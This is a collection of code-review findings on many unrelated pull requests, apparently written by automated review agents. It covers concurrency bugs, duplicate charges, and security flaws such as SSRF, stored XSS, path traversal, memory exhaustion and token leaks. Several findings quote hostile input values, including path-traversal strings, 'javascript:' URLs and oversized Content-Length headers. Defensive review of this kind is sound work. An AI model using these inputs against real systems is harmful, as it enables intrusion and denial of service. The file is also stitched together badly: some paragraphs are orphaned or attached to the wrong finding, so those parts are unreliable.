findings.title: Blocking requests.get inside async function stalls the event loop
findings.body:
`fetch_plan_limits` is a coroutine but calls `requests.get`, which is synchronous. There is no `await` in the body, so the whole event loop — every other in-flight request on this worker — is frozen for the duration of the HTTP call, up to the 5s timeout (longer if DNS/connect hangs before the timeout applies). Under load this serialises all request handling.

Use the same `httpx.AsyncClient` pattern already established in `fetch_plan` above, e.g. `async def fetch_plan_limits(client: httpx.AsyncClient, tenant_id): response = await client.get(...)`, and drop the `requests` import. If a sync client is unavoidable, wrap it in `anyio.to_thread.run_sync` / `loop.run_in_executor` so it does not run on the loop thread.

findings.title: Unencoded tenant_id interpolated into internal billing URL
findings.body:
`fetch_plan_limits` builds the request URL with an f-string: `f"https://billing.internal/limits/{tenant_id}"`. `tenant_id` is not validated or percent-encoded. If it originates from a request parameter, a value such as `1/../../admin/keys`, `1?internal=true` or `1#` lets the caller steer the path/query of a request that this service makes to an internal, likely unauthenticated, billing host — i.e. a path-traversal-flavoured SSRF against `billing.internal`, with the response body returned to the caller via `response.json()`.

Fix: validate `tenant_id` against the expected shape (e.g. int or UUID) before use, or pass it through `urllib.parse.quote(str(tenant_id), safe="")`. Note the pre-existing `fetch_plan` on line 6 has the same shape, so a shared validation helper is probably the right move.

findings.title: New async function has no test to catch blocking-call regression
findings.body: fetch_plan_limits is a new async def that calls the blocking `requests.get` (line 11) instead of an async HTTP client. Nothing in this diff exercises this function, so a test suite would not currently detect that this call blocks the event loop during request handling — exactly the failure mode this PR is meant to avoid per its title. Add a test that calls fetch_plan_limits and asserts either the correct use of an async client or measures that it does not block the loop (e.g., via a mocked async transport).

findings.title: Bare `except` swallows KeyboardInterrupt/SystemExit and logs nothing
findings.body:
`except:` catches `BaseException`, not just `Exception`. That means a `KeyboardInterrupt` (Ctrl-C during a slow socket send), a `SystemExit` raised by a shutdown handler, or a `MemoryError` raised inside `_client.send` is absorbed and converted into a quiet `return None`, so shutdown and cancellation signals delivered while the metrics call is in flight are lost. The PR description says "catch and log, then continue", but there is no logging call in the handler — every push failure, including a misconfigured endpoint or a permanently broken client, is now completely silent and undiagnosable.

Narrow the clause to `except Exception:` and emit a log record (e.g. `logger.warning("metrics push failed", exc_info=True)`) before returning.

findings.title: No test covers the new exception-handling behaviour
findings.body: The change alters push_metrics to catch all exceptions from _client.send and return None instead of propagating. There is no test in this diff verifying that (a) an exception raised by _client.send is caught, (b) the function returns None in that case, or (c) the normal success path still returns the client's result. Since this is the entire point of the PR, a regression that reintroduces the fatal failure (or breaks the success path) would not be caught by any existing test.

findings.title: try_consume check-then-act races: limit bypass and lost updates
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` at line 15, then hits `await asyncio.sleep(0)` at line 18 — an explicit yield point — before writing `_counters[tenant] = current + cost` at line 19. Unlike `consume`, it never acquires `_lock`.

Two concrete failures follow:

1. Limit bypass: two coroutines for the same tenant can both read `current = 999`, both pass the `> LIMIT` check, and both return `True`, admitting 2×cost past `LIMIT`. With N concurrent callers the overshoot is unbounded.
2. Lost update: the write is an absolute assignment derived from a stale read, not an increment. Any `consume()` (or other `try_consume`) that commits during the await window is silently overwritten and its cost discarded, so the counter under-reports usage permanently.

Fix by holding the same lock across the read, the decision and the write, and by re-reading inside the critical section:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

(and drop the `await asyncio.sleep(0)`, or move it outside the critical section — awaiting inside a lock is fine here only because nothing else can interleave).

_Also raised by the security agent:_ try_consume checks and updates the counter without the lock (limit bypass)

findings.title: No test covers try_consume's concurrency behavior or limit enforcement
findings.body: try_consume introduces both a new rate-limit invariant (reject when current+cost>LIMIT) and a check-then-act race (unlocked read at line 15, await at line 18, unlocked write at line 19). No test file is included in this diff, so nothing would catch either (a) a simple off-by-one in the LIMIT comparison, or (b) two concurrent calls to try_consume for the same tenant both passing the check and pushing the total over LIMIT. Add a test that runs multiple concurrent try_consume calls against the same tenant near the limit and asserts the total consumed never exceeds LIMIT.

Either keep returning a tuple (optionally a `NamedTuple`, which stays unpack-compatible while exposing `.tier`), or update every caller in the same change: `u = lookup_user(id); u["name"], u["email"]`.

findings.title: WriteSettlement always returns nil, swallowing insert failures
findings.body:
The `err` from `db.Exec` is scoped to the `if` statement on line 15; it is logged and then discarded. Lines 18-19 declare a brand-new, never-assigned `err` and return it, so `WriteSettlement` returns `nil` unconditionally — including when the INSERT failed. Any caller that does `if err := WriteSettlement(...); err != nil` will treat a dropped settlement row as a successful write, so the end-of-day batch will mark settlements as persisted that do not exist in the table, with only a log line as evidence. This also diverges from `WriteEntry` directly above (line 7-8), which propagates the Exec error.

Fix: return the Exec error, e.g.

```go
if _, err := db.Exec(...); err != nil {
	log.Printf("settlement insert failed: %v", err)
	return err
}
return nil
```

If the intent really is "log and continue", that decision belongs in the batch loop that calls this function, not hidden inside the writer, since the signature advertises an error.

No test file accompanies this change, so this behavior — which likely differs from the intended 'return the insert error' — is not exercised anywhere and would not fail if it regresses further or if it's the root defect itself.

findings.title: Mutable default argument accumulates state across calls
findings.body:
`attempted=[]` is evaluated once at function definition time, so every call that omits the argument mutates and returns the *same* list object. The first call returns the failures for that batch; the second call returns its own failures plus all previous ones, and the list grows without bound for the process lifetime. Callers that treat the return value as "the recipients that failed in this batch" will get wrong results from the second call onward, and the list is a hidden memory leak.

Fix with the standard sentinel pattern:

```python
def send_with_retries(recipients, attempted=None):
    attempted = [] if attempted is None else attempted
    ...
```

_Also raised by the security agent:_ Shared default list leaks recipients across calls and grows unbounded

findings.body: The function `send_with_retries` has a mutable default argument `attempted=[]` that is modified in place on line 10. This means the function's behavior on subsequent calls will differ from what a caller would expect based on the signature alone. The list is not reset between calls, so previous failures accumulate. A caller reading this signature would not realize that omitting the `attempted` parameter on the second call will include results from the first call. Document this behavior, or refactor to use `attempted=None` with proper initialization.

findings.title: compute_rounding silently changes half-cent rounding behaviour
findings.body:
This PR is described as a pure rename, but `compute_rounding` also changed its comparison from `line.remainder_cents >= 0.5` to `line.remainder_cents > 0.5`. A line with a remainder of exactly 0.5 now rounds down to 0 instead of up to 1 — the classic half-cent case, which is far from rare in money arithmetic and will produce off-by-one-cent totals versus the previous behaviour and versus any stored/reconciled figures.

If the change is intentional, it needs to be split out of the rename with a test and a note about the financial impact. If not, restore `>=`.

_Also raised by the security agent:_ Rounding comparison silently changed from >= 0.5 to > 0.5

findings.title: Off-by-one in page_of_sorted drops one record per page
findings.body:
`page_of_sorted` slices `ordered[start : start + PAGE_SIZE - 1]`, which yields at most `PAGE_SIZE - 1` items, while `start` still advances by a full `PAGE_SIZE` per page (line 11). The record at index `start + PAGE_SIZE - 1` is therefore never returned by any page — exported data silently loses one row per page, and callers that detect the last page by `len(result) < PAGE_SIZE` will treat every page as the final one. Change the slice to `ordered[start : start + PAGE_SIZE]` to match `page_of` on line 6.

Secondarily, the return shape changed: the old function returned 1 or 2 lines depending on whether a PO existed; it now always returns 2. Any caller that indexes or length-checks the result, or that renders the list verbatim, will now emit a bogus `PO` line for invoices without one.

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`@retry(attempts=3)` is applied to `charge_card`, which calls `billing.gateway.charge`. The gateway docstring states plainly: "POST /charges. NOT idempotent: each call creates a new charge." Any failure that occurs after the gateway has accepted the request — a timeout, a dropped connection, a 5xx returned after the charge is written — will be retried and will create a second (and possibly third) charge for the same customer. The retry cannot distinguish "never arrived" from "arrived and the response was lost", so this is reachable on ordinary network flakiness, which is precisely the condition the retry was added for.

The gateway already offers the fix: it supports an `Idempotency-Key` header. Generate one key per logical charge attempt (outside the retry loop, so all attempts share it) and pass it through `charge(...)`, then the retry is safe. Until that key is plumbed through, `charge_card` should not be retried.

`fetch_charge` on line 6 is fine — `get_charge` is documented as safe to repeat.

_Also raised by the docs agent:_ Signature does not match gateway contract for Idempotency-Key

findings.title: Undocumented retry on non-idempotent charge operation
findings.body:
The `charge_card` function retries a non-idempotent operation (`charge`) without documenting the contract requirement. The underlying `charge` function explicitly warns that it is 'NOT idempotent: each call creates a new charge' and requires an Idempotency-Key header to make retries safe. A caller using `charge_card` without passing this header through will create duplicate charges on retry, but the function documentation does not warn of this.

Add a docstring to `charge_card` that explicitly documents the non-idempotent nature and the requirement to pass an Idempotency-Key header, or ensure the implementation passes one automatically.

findings.body: charge_card wraps billing.gateway.charge, which is explicitly documented as NOT idempotent (each call creates a new charge unless an Idempotency-Key is passed). There is no test in this diff that would fail if charge_card retried and produced duplicate charges, or that verifies an idempotency key is passed through on retry.

findings.title: Naive datetime subtracted from tz-aware expires_at raises TypeError
findings.body:
`datetime.now()` returns a naive local datetime, but `Invite.expires_at` is documented as always timezone-aware UTC. Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so `expires_within` fails for every input rather than returning a boolean. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does. Note that even if the exception were avoided (e.g. by a naive `expires_at`), `datetime.now()` is local-time, so the comparison would silently be off by the UTC offset.

"";` or `string | undefined`), or narrow the parameter to a type where `billingContact` is required so callers are forced to prove presence. findings.title: Index duplicates invoices_tenant_created_idx from migration 0007

findings.title: priority=9 puts reset emails last, not first (scale is inverted)

`enqueue`'s documented contract is that `priority` is an ordering index where **0 is drained first and 9 is drained last**; the docstring even warns that the name suggests the opposite. Passing `priority=9` therefore places password-reset mail behind every other queued job — including the nightly digest batch this PR is trying to jump ahead of. It is also worse than the previous behaviour, which used the default of 5. Change the call to `enqueue(ResetEmail(user, token), priority=0)` (or a small value) to actually drain resets first.

findings.title: upsert() called with non-normalized terms violates documented contract
findings.body:
The `upsert()` function in `search/index.py` has a documented requirement that `terms` must already be lower-cased and de-duplicated. The docstring explicitly warns: "a term differing only by case creates a second posting list, and queries — which do lower-case — will never match it."

The new call on line 7 passes `article.title.split()` directly without lowercasing. Article titles likely contain uppercase characters, which will create posting lists that queries cannot match, leaving the article silently unfindable.

findings.title: upsert called with un-normalised terms; titles silently unsearchable
findings.body:
`article.title.split()` yields the title's words with their original casing (and duplicates). `search.index.upsert` documents that `terms` must already be lower-cased and de-duplicated, and it performs no normalisation itself \u2014 it just does `_POSTINGS.setdefault(term, set()).add(doc_id)`. Since queries lower-case their terms, every capitalised word in a title (i.e. most words in most titles) lands in a posting list that no query can ever reach. The publish succeeds, so the failure is silent.

Normalise at the call site, e.g. `upsert(article.id, {w.lower() for w in article.title.split()})` \u2014 a set also satisfies the de-duplication half of the contract. (Alternatively, move normalisation into `upsert`, but that changes behaviour for any other caller.)

Nothing verifies that published articles become searchable, and nothing would catch a defect such as passing non-normalised terms (upsert's docstring notes terms must be lower-cased and de-duplicated, which article.title.split() is not). A test asserting that after publish(article) a subsequent search finds the article by a lower-cased term would catch both a regression in this wiring and the normalisation mismatch.

findings.title: Referer header logged unscrubbed, leaking the auth token into logs
findings.body:
The removed branch existed specifically because `Referer` is the one header here that can contain credentials: `token_authenticated_url` builds notebook URLs as `{base}?token={token}`, so the browser sends that token back in `Referer` on every subresource request. Replacing the per-header handling with a blind `headers[header] = request.headers[header]` means every 5xx now serialises a live auth token into the log via `json.dumps` on line 6 — readable by anyone with log access, and typically shipped off-host to aggregation.

Restore the conditional scrub for `Referer` (`value = _scrub_uri(value, extra_param_keys)`) before inserting into `headers`. If the goal was simply to see more of what the client sent, scrubbing only strips the sensitive query params and leaves the rest of the URI intact, so nothing diagnostic is lost.

Secondary consequence: with the only call site removed, the `extra_param_keys` parameter threaded into this function is now unused, which is a signal in itself that the sanitisation path was dropped rather than intentionally replaced.

_Also raised by the security agent:_ Auth token leaked into logs: Referer scrubbing removed

findings.title: Removed Referer-scrubbing has no test guarding against regression
findings.body: The change deletes the `_scrub_uri` call that previously stripped the token query parameter from the Referer header before logging. Since `token_authenticated_url` embeds the auth token in the URL and browsers echo it back via Referer, this log line will now include the raw token. No test in this diff (or referenced) exercises `log_request`/`log_method` with a Referer header containing a token to confirm it is scrubbed or not present in the output, so this regression would go completely undetected.

findings.title: Dropping xlinkhref from link check reopens SVG javascript: XSS
findings.body: `validateProp` previously routed `href`, `src` **and** `xlinkhref` through `isAnchorLinkAllowed`, which rejects the `unsafeLinkPrefix` schemes (`javascript:`, `data:text/html`, `vbscript:`). After this change `xlinkhref` no longer reaches that branch and falls through to the permissive path, so markup such as `` renders with an executable URL. `xlink:href` is honoured by browsers on SVG `` (and historically on ``, enabling same-document script inclusion), so this is not a dead attribute. Adversary: any user who can submit markdown content in this product. What they control: the full attribute value, including the scheme. What they get: script execution in the session of every viewer of that content — stored XSS, i.e. session/cookie theft and actions as the victim. If the goal is to shrink the attribute surface, remove `xlinkhref` from the *allowlist* of permitted attributes so it is stripped entirely, rather than removing it from the scheme validation while still allowing it through.

findings.title: xlinkhref no longer validated against unsafe URL schemes
findings.body:
`xlinkhref` was previously routed through `isAnchorLinkAllowed(value)` together with `href` and `src`. After this change it falls past line 7 into whatever the function's default disposition is. The stated intent — "drop rarely used SVG attributes we do not need" — would require removing the attribute from the *allowlist* so it is dropped; removing it from the *validation* branch instead leaves the attribute renderable with an unvalidated value. Since `xlink:href` is a URL-bearing attribute that browsers will navigate/execute (`xlink:href="javascript:..."` on an SVG `<a>`), the result is that a scheme the module explicitly enumerates as unsafe (`unsafeLinkPrefix = ['javascript:', 'data:text/html', 'vbscript:']`) can reach the DOM from user-submitted markdown.

Either restore `attribute === 'xlinkhref'` in this condition, or — if the goal really is to stop supporting the attribute — reject it explicitly (return `false`) rather than letting it fall through. Please also confirm the function's terminal `return` for unmatched attributes: if it is `return true`, this is an exploitable XSS regression.

findings.title: No test guards xlink:href attribute sanitisation behavior
findings.body: The change removes 'xlinkhref' from the set of attributes routed through isAnchorLinkAllowed, meaning xlink:href values (e.g. javascript: URIs on SVG <a> elements) will no longer be validated against unsafeLinkPrefix. No test file is present in this diff, and no evidence was given that an existing test exercises validateProp with attribute === 'xlinkhref'. If such a test existed and asserted the previous behavior, this change should have broken it — the fact that it's silently landing here suggests either no test covers this path, or a test was removed/weakened alongside it undetected.

findings.title: Removing ValidateID lets unvalidated project name reach buildPath
findings.body:
`projectQueryParameter` comes straight from the request query string. With the `common.ValidateID` check deleted, the only remaining check on line 4 is an equality comparison against `parameters.Project`, which does nothing when the path parameter is absent (`len(parameters.Project) == 0`). The value then flows to the file DAO, whose `buildPath` explicitly documents: "It does no validation of its own: callers are required to have validated the names before this point." `filepath.Join(d.Folder, project, kind)` cleans the path, so a project value such as `../../etc` resolves outside `d.Folder`, giving read access to files outside the configured storage root (and, for non-file backends, an unvalidated identifier reaching the store).

The PR description claims "the path join already scopes under the folder root" — that is not true of `filepath.Join`, which normalises `..` rather than rejecting it. Restore the `common.ValidateID(projectQueryParameter)` check, or move an equivalent validation into `buildPath` and update its contract comment.

_Also raised by the security agent:_ Removing ValidateID lets `project` query param traverse out of storage root

findings.title: No test guards removal of project-name validation
findings.body: The diff removes the common.ValidateID check on projectQueryParameter, which previously guaranteed that only well-formed identifiers reach buildPath (whose doc comment explicitly states it relies on callers to validate names before joining into a filesystem path). There is no test in this change exercising list() with a malicious or malformed projectQueryParameter (e.g. containing '..' or path separators) to confirm the join still resolves safely under the folder root, nor a test verifying the previous 'invalid project name' error path was intentionally dropped. If this change is wrong, nothing in the test suite would fail.

findings.title: Buffer reserved from untrusted Content-Length before any body is read
findings.body:
`contentLength` is the value the client declared in the upload request; it is passed straight into `Reserve` so the pool-backed RW allocates up front, before `io.Copy` on line 8 has read a single byte. A client can send `Content-Length: 10995116277760` with an empty or trickled body and cause the server to reserve that much memory per in-flight part — with concurrent parts this is a trivially cheap remote memory-exhaustion. The previous code grew the buffer a page at a time as bytes actually arrived, so allocation was bounded by real data received.

Clamp the reservation to a sane ceiling (e.g. the configured maximum part size, or a fixed cap such as a few MiB) and let the buffer grow past that only as real bytes arrive: `rw := multipart.NewRW().Reserve(min(contentLength, maxReserve))`, and reject the request outright if `contentLength` exceeds the allowed part size.

findings.title: Buffer pre-reserved from client-declared Content-Length (remote OOM)
findings.body:
`multipart.NewRW().Reserve(contentLength)` commits memory up front based on `contentLength`, which for an S3 UploadPart request is the client-supplied `Content-Length` header — it is a *declaration*, not a measurement of bytes actually delivered. A client that reaches this S3 endpoint can send `Content-Length: 5368709120` with a one-byte body (or simply stall the connection) and force a multi-gigabyte reservation per in-flight part; a handful of concurrent requests exhausts the process and kills the server for every other user. The previous grow-as-you-read behaviour bounded the allocation by bytes genuinely received, which is exactly the property being removed here.

Suggested fix: clamp the reservation to a sane ceiling before calling it, e.g. reserve `min(contentLength, maxPartBuffer)` and only for non-negative values, and keep enforcing the real limit on the `io.Copy` result (`n`) so an over-declared or under-declared body is still rejected. Note `contentLength` may also be `-1`/negative for chunked or unknown-length bodies; `Reserve` should not be handed that value.

_Also raised by the correctness agent:_ Negative/unknown Content-Length (-1) passed to Reserve unchecked

findings.title: No test exercises Reserve(contentLength) behavior or edge cases
findings.body: The change introduces a call to Reserve(contentLength) to pre-allocate the multipart buffer, replacing incremental page-by-page growth. contentLength can be -1 (unknown length, per HTTP semantics) or attacker-influenced via Content-Length header. There is no test verifying that Reserve handles negative, zero, or very large values correctly, nor that the resulting buffer still produces correct MD5/ETag output after this change. If Reserve misbehaves on edge-case lengths (e.g. panics or under/over-allocates for -1), nothing here would fail.

findings.title: S3 scheme default flips from https to http when is_secure is unset
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` only selected plaintext when a caller explicitly set `is_secure = False`; every other case — including the common one where the key is absent and `.get()` returns `None` — produced `https`. The new expression `"https" if request.meta.get("is_secure") else "http"` treats any falsy value the same as `False`, so a missing key now yields `http`. Every existing caller that never sets `request.meta["is_secure"]` will start sending signed S3 requests (including the Authorization/signature headers) over unencrypted HTTP on line 6's URL. Restore the explicit identity test, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or use `request.meta.get("is_secure", True)` so the secure default is preserved.

_Also raised by the tests agent:_ No test covers default scheme when is_secure is unset

findings.title: S3 requests default to plaintext HTTP when is_secure meta is unset
findings.body:
The old expression was `"http" if request.meta.get("is_secure") is False else "https"` — an explicit opt-out: only a literal `False` produced HTTP, and everything else (including the common case where the key is absent and `.get()` returns `None`) produced HTTPS. The new expression `"https" if request.meta.get("is_secure") else "http"` treats every falsy value — `None`, missing key, `0`, `""` — as insecure, so the default for any request that does not explicitly set `request.meta["is_secure"] = True` flips to plaintext.

The resulting `url` on line 6 is what the handler fetches, so the AWS-signed request (signature/session headers) and the object body travel unencrypted to `s3.amazonaws.com`. Anyone on the network path — shared Wi-Fi, a compromised ISP hop, a transparent proxy in a container network — can read the credentials/signature material and the fetched data, and can tamper with the response body that then flows into the spider's parsing code.

Restore the opt-out semantics: `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or if the simpler form is wanted, default the lookup explicitly: `request.meta.get("is_secure", True)`.

findings.title: DELETE now authorises as "push", removing the delete permission check
findings.body:
The old switch mapped `http.MethodDelete` to the `"delete"` action. The new condition only excludes GET and HEAD, so DELETE falls into the `"push"` branch and `requestedAccess` is built with `Action: "push"`. Any principal holding push on a repository can now delete tags/manifests/blobs, and no request can ever produce `"delete"`, so any delete-scoped grants in existing policies become dead configuration. Restore an explicit `case http.MethodDelete: action = "delete"` (or an equivalent branch) before the push fallback.

_Also raised by the security agent:_ DELETE now authorises as "push", bypassing the delete permission

findings.title: Action mapping no longer matches documented contract
findings.body: The code now collapses DELETE requests to 'push' instead of 'delete', eliminating the distinction documented in pkg/api/config/config.go. The repository documentation explicitly states: 'The three actions are distinct on purpose: an account may be allowed to push new tags without being allowed to delete existing ones.' This change silently removes that ability to control delete separately from push, contradicting the documented access control model.

findings.title: No test guards DELETE now mapping to push, not delete
findings.body: The change removes the distinct "delete" action for http.MethodDelete, folding it into "push". Per the repo's own access-control docs (config.go), push and delete are deliberately distinct so an account can push without being allowed to delete. This diff contains no test verifying that a DELETE request maps to the correct action, so this authorization-relevant behavior change would not be caught by any existing or added test.

findings.title: Unknown methods (e.g. OPTIONS) now require push instead of pull
findings.body: The removed `default:` arm mapped any method outside the enumerated set to `"pull"`. The new negated condition sends every non-GET/HEAD method — including OPTIONS and TRACE, e.g. CORS preflight — down the `"push"` path, so read-only clients that previously passed authorisation for those methods will now be rejected. If the intent was to keep the old default, the condition should enumerate the write methods (POST/PATCH/PUT/DELETE) rather than negate the read methods.

findings.title: Size bound clears whole cache, discarding the just-fetched entry
findings.body:
`_CACHE[tenant_id] = tenant` is immediately followed by `if len(_CACHE) > 1000: _CACHE.clear()`. When the threshold is crossed, the entry that was just fetched and written is wiped along with every other tenant, so a caller that does `get_tenant_fresh(t)` and then `get_tenant(t)` gets `None` back for a tenant it just refreshed — the opposite of what the function is evidently for. It also drops all other tenants at once, turning a single refresh into a full cold-start for every reader. If the intent is to bound the cache, evict a single entry (e.g. `collections.OrderedDict` + `popitem(last=False)` or `functools.lru_cache`-style LRU) rather than flushing, and do the eviction before inserting the new value so the fresh entry survives.

_Also raised by the security agent:_ Caller-supplied tenant_id can force a full shared-cache flush

findings.title: New get_tenant_fresh function has no test coverage
findings.body: get_tenant_fresh introduces both a fetch-and-cache behavior and a size-based eviction policy (clearing the entire cache once it exceeds 1000 entries). No test exercises either behavior, so a change that breaks the fetch, the cache write, or the eviction threshold (e.g., an off-by-one, or clearing on every call) would not be caught.

findings.title: README documents removed --workers flag
findings.body:
The README on line 7 documents `--workers` as a command-line flag, but the code has renamed it to `--concurrency`. Users following the README will use the wrong flag name and get an error. Update the documentation to match the new flag name.

_Also raised by the correctness agent:_ README still documents --workers after the rename

findings.title: Renaming --workers breaks existing callers and args.workers accesses
findings.body:
`p.add_argument("--workers", ...)` became `--concurrency`. Two contracts break at once: (1) any existing invocation, script, systemd unit or CI job passing `--workers` now exits with `error: unrecognized arguments`, and (2) the argparse namespace attribute changes from `args.workers` to `args.concurrency`, so any consumer of `parser().parse_args()` that still reads `args.workers` raises `AttributeError` at runtime.

If the rename is intended, grep for `args.workers` / `.workers` and update every consumer in the same change, and consider keeping the old spelling as a deprecated alias (`p.add_argument("--concurrency", "--workers", dest="concurrency", type=int, default=4)`) for at least one release.

findings.title: Flag rename has no visible test coverage
findings.body: The `--workers` flag was renamed to `--concurrency`. If this diff is wrong (e.g. typo, wrong default, or a caller elsewhere still passes `--workers`), nothing in the shown diff would catch it — there is no test file included and no repository context was retrieved to confirm existing parser tests exist. If the surrounding repo does have CLI tests, they should be updated to assert on `--concurrency`; if it doesn't, this is a policy gap rather than a regression in this PR.

findings.title: Docstring contradicts new return type
findings.body: The docstring states the function returns "the total number of API calls this month as an integer", but the implementation now returns a dictionary mapping days to call counts. This is a significant contract change that callers need to know about. Update the docstring to accurately describe the new return value: a dict mapping day to count.

findings.title: Return shape changed from int to dict; callers and docstring still assume int
findings.body:
`monthly_usage` previously returned a scalar integer (`_db.scalar(...)`) and now returns `{day: count}`. Any existing caller doing arithmetic, comparison, or formatting on the result (e.g. `monthly_usage(a) > limit`, `f"{monthly_usage(a)} calls"`) will now silently misbehave or raise `TypeError`. The docstring on line 2 still states "Return the total number of API calls this month as an integer", so there is no in-code signal to callers that the contract changed.

Either keep the total available (e.g. return both, or add a new `monthly_usage_by_day` function and leave `monthly_usage` intact), or update every call site and the docstring together. No callers were retrieved for this review, so please confirm the call sites explicitly before merging.

findings.title: Return type change to per-day dict has no visible test coverage
findings.body: monthly_usage now returns a dict keyed by day instead of a single integer total, but no test file is included in this diff. If existing tests assert on the old integer return value, they would fail loudly (good), but if there are no tests at all, an incorrect implementation (e.g. wrong grouping, wrong key names, or a broken query) would go undetected. Since no test file is part of this change, add a test that asserts on the actual dict contents returned by monthly_usage for a known set of rows.

findings.title: Renaming page_size to limit breaks keyword-argument callers
findings.body: `list_invoices` previously accepted `page_size`; the parameter is now named `limit`. Positional callers are unaffected, but any existing call of the form `list_invoices(tid, page_size=100)` will now raise `TypeError: list_invoices() got an unexpected keyword argument 'page_size'` at runtime, and this is a public-looking API module. Either grep and update all call sites in the same change, or keep backward compatibility for a release, e.g. accept `page_size=None` as a deprecated alias and map it onto `limit` with a warning. No call sites were retrieved here, so the actual blast radius still needs to be checked before merge.

findings.title: Parameter rename has no test coverage for callers using old kwarg
findings.body: list_invoices's keyword parameter was renamed from page_size to limit, which breaks any caller invoking it as list_invoices(tenant_id, page_size=...). No test in this diff exercises the function's call signature, so nothing would fail if this rename silently breaks an existing caller.

findings.title: Docstring references renamed parameter by old name
findings.body: The docstring on line 6 still documents the parameter as 'page_size', but the function signature on line 1 has renamed it to 'limit'. A caller reading the docstring would look for a 'page_size' parameter that no longer exists. Update the docstring to refer to the new parameter name 'limit'.

findings.title: Absolute `from adapters import HTTPAdapter` will fail to import
findings.body: Every other import in this module is explicitly relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). `from adapters import HTTPAdapter` is an absolute import of a top-level module named `adapters`, which does not exist on `sys.path`; on Python 3 (and on Python 2 under `absolute_import`) importing `requests.sessions` — i.e. importing `requests` at all — raises `ImportError`. Change it to `from .adapters import HTTPAdapter`.

findings.title: verify/cert accepted by request() but never reach the adapter
findings.body:
The new `request()` signature still accepts `verify=None` and `cert=None` (lines 148-149), but the body only copies method, url, headers, files, data, params, auth, cookies, allow_redirects, proxies and hooks onto the `Request` (lines 151-163) before calling `self.send(prep)`. Neither `verify` nor `cert` is attached to the request, and `send()` (lines 363-367) builds a bare `HTTPAdapter()` with no configuration, so whatever the adapter's built-in default is becomes the only TLS policy in effect. A caller that explicitly passes `verify='/path/to/ca.pem'` or supplies a client certificate via `cert=` gets no error and no effect — the argument is inert. If the adapter's default is anything other than full CA verification, every request on this path is open to an on-path network attacker (anyone able to intercept the TLS connection: hostile Wi-Fi, a compromised proxy, a BGP/DNS hijack) who presents a forged certificate and reads or rewrites the plaintext, including the `auth` credentials set on line 158.

Thread `verify`, `cert` (and `timeout`, which is dropped the same way and leaves requests able to hang indefinitely) through to `adapter.send()`, or raise/assert rather than accepting parameters the send path ignores.

findings.title: `_send_request` deleted but `old_request` still calls it
findings.body: The `_send_request` helper was removed in this diff, yet `old_request` still ends with `return self._send_request(r, **args)` at line 292. Any call that reaches `old_request` now raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either keep the helper until `old_request` is deleted, or delete `old_request` in the same change.

findings.title: New `request()` silently discards timeout, verify, cert, prefetch and session defaults
findings.body: The new `request()` keeps the full public signature but only forwards `method, url, headers, files, data, params, auth, cookies, allow_redirects, proxies, hooks` onto the `Request` object. `timeout`, `verify`, `cert`, `prefetch`, `return_response` and `config` are accepted and then thrown away, so existing callers doing `session.get(url, timeout=5)` or `verify=False` now get no timeout and unchanged TLS verification with no error — a silent behaviour change rather than a failure. Equally, the session's own `self.headers`, `self.cookies`, `self.auth`, `self.params` and `self.hooks` are no longer merged into the request, so a configured `Session` behaves like a bare one. Either merge/forward these into `prepare()`/`send()` or drop them from the signature so callers fail loudly.

findings.title: `close()` is now a no-op and `send()` creates a new adapter per request
findings.body: `close()` used to call `self.poolmanager.clear()`, releasing pooled sockets; it is now `pass`, and `init_poolmanager`/`self.poolmanager` are gone entirely, so `with requests.Session() as s:` and explicit `s.close()` leak connections. Compounding this, `send()` instantiates a fresh `HTTPAdapter()` on every call (line 365), so each request gets its own pool and connection reuse — the whole point of the Session — is lost, and those pools are never closed either. Hold a single adapter on the Session (e.g. mounted in `__init__`) and have `close()` clear it. Note also that any external code referencing `session.poolmanager` or `session.init_poolmanager()` now raises `AttributeError`.

findings.title: Session.send delegates to new HTTPAdapter with no test coverage (and 2 more)
findings.body:
send() now constructs an HTTPAdapter and delegates sending to it instead of calling request.send() directly. This is a core behavior change in how every request is dispatched, but there is no test in this diff verifying that the adapter-based path returns an equivalent response or behaves correctly for basic requests.

The same gap appears at 2 other place(s) in this change:

- `requests/sessions.py:131` — close() now a no-op with no test to catch the regression
- `requests/sessions.py:134` — New request() building PreparedRequest via req.prepare() is untested

_Collapsed into one comment: this is one piece of work, not 3 separate ones._

findings.title: Stale docstring: close() no longer manages PoolManager
findings.body: The close() method previously documented that it disposed of internal state by closing a PoolManager and its pooled connections. The implementation now does nothing (`pass`). The old docstring must be removed or updated to reflect the new behavior. Callers relying on close() to clean up connections will find it does nothing.

findings.title: Unqualified `from adapters import ...` resolves against sys.path
findings.body: Every other import in this module is package-relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import ...` on lines 18-19), but line 22 uses a top-level `from adapters import HTTPAdapter`. Under absolute-import semantics this is resolved against `sys.path`, not the `requests` package, so any `adapters.py` earlier on the path — e.g. one dropped in the working directory of a script, or in a shared/world-writable site directory — is imported and executed inside the HTTP client, with its `HTTPAdapter.send()` receiving every outbound request (URL, headers, auth). The adversary is a local user or anyone able to write to a directory that ends up on `sys.path`; what they get is arbitrary code execution in the caller's process plus full visibility of request traffic. Use `from .adapters import HTTPAdapter` to bind it to the package.

findings.title: cookies property returns None on parse failure, breaking all callers
findings.body:
When `Cookie.SimpleCookie.load()` raises, the new property assigns `self._cookies = None` and returns `None` (and caches it, so every later access also returns `None`). The previous implementation in `web.py` recovered by calling `clear_all_cookies()` and still returned a `SimpleCookie` instance, so callers always got a mapping.

The callers updated in this same diff assume a mapping:

* `get_cookie` (web.py:321) does `if name in self.request.cookies` → `TypeError: argument of type 'NoneType' is not iterable`.
* `clear_all_cookies` (web.py:367) does `self.request.cookies.iterkeys()` → `AttributeError: 'NoneType' object has no attribute 'iterkeys'`.

